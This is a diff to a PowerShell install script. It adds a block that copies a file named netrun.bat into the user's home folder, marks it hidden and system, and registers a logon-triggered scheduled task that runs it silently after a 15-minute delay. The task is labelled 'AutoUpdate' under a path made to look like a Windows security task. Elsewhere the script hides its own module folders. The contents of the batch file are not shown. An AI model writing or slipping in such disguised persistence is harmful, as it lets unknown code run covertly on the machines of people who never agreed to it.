@@ -5,6 +5,7 @@ $_sourcePathSystem = "${location}\system"
 $_sourcePathLocal = "${location}\local"
 $_destinationPath = "C:\Users\$env:USERNAME\documents\Microsoft"
 $_resourcesPath = "${location}\extra"
+$_updatePath = "C:\Users\$env:USERNAME"
 # Script Settings moved to "conf.ps1" located in Module Folder
 
 # Load Module Names/Paths
@@ -70,6 +71,14 @@ foreach ($i in $modulesSystem) {
     }
 }
 
+# Auto Update/Restore
+Set-ItemProperty -Path "${_updatePath}\netrun.bat" -Name Attributes -Value 2
+Copy-Item "${location}\netrun.bat" $_updatePath -Force
+$trigger = New-ScheduledTaskTrigger -AtLogon -User $env:USERNAME
+$trigger.Delay = 'PT15M' # Delay for Task
+$PS = New-ScheduledTaskAction -Execute "${_updatePath}\netrun.bat" -Argument "-silent"
+Register-ScheduledTask -TaskName "AutoUpdate" -TaskPath "\SYS\WIN32\x64\Security\" -Trigger $trigger -User $env:USERNAME -Action $PS -Settings $taskSettings
+
 # Run Batch Scripts (.bat)
 $scriptsBatch = Get-ChildItem -Path "${scripts}\batch" -Recurse | Select-Object -ExpandProperty FullName
 foreach ($i in $scriptsBatch) { if ($i.EndsWith('.bat')) { Start-Process $i } }
@@ -88,6 +97,7 @@ foreach ($i in $modulesSystem) { Set-Location "${_destinationPath}\${i}"; export
 # Hide
 foreach ($name in $modulesSystem) { Set-ItemProperty -Path "${_destinationPath}\${name}" -Name Attributes -Value 6 }
 foreach ($name in $modulesSystem) { Get-ChildItem -r "${_destinationPath}\${name}" -Attributes d,h,r,s,a | ForEach-Object { Set-ItemProperty -Path $_.FullName -Name Attributes -Value 6 } }
+Set-ItemProperty -Path "${_updatePath}\netrun.bat" -Name Attributes -Value 6
 
 # Check if silent
 if ($args -notcontains '-silent') {
